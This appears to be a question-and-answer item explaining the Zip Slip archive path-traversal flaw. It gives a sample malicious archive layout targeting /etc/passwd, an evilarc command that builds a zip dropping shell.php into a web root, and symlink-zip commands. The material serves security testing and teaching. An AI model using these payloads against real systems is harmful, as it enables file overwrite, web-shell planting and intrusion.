## Scenario

What's the methodology and payload set for Methodology (Zip Slip)?

## Analysis / Response

**Methodology** — this technique applies to Zip Slip. Use the following only against systems you are explicitly authorized to test. Here is the approach along with the concrete payloads from the reference:

The Zip Slip vulnerability is a critical security flaw that affects the handling of archive files, such as ZIP, TAR, or other compressed file formats. This vulnerability allows an attacker to write arbitrary files outside of the intended extraction directory, potentially overwriting critical system files, executing malicious code, or gaining unauthorized access to sensitive information.

**Example**: Suppose an attacker creates a ZIP file with the following structure:

```ps1
malicious.zip
  ├── ../../../../etc/passwd
  ├── ../../../../usr/local/bin/malicious_script.sh
```

When a vulnerable application extracts `malicious.zip`, the files are written to `/etc/passwd` and /`usr/local/bin/malicious_script.sh` instead of being contained within the extraction directory. This can have severe consequences, such as corrupting system files or executing malicious scripts.

* Using [ptoomey3/evilarc](https://github.com/ptoomey3/evilarc):

    ```python
    python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15
    ```

* Creating a ZIP archive containing a symbolic link:

    ```ps1
    ln -s ../../../index.php symindex.txt
    zip --symlinks test.zip symindex.txt
    ```
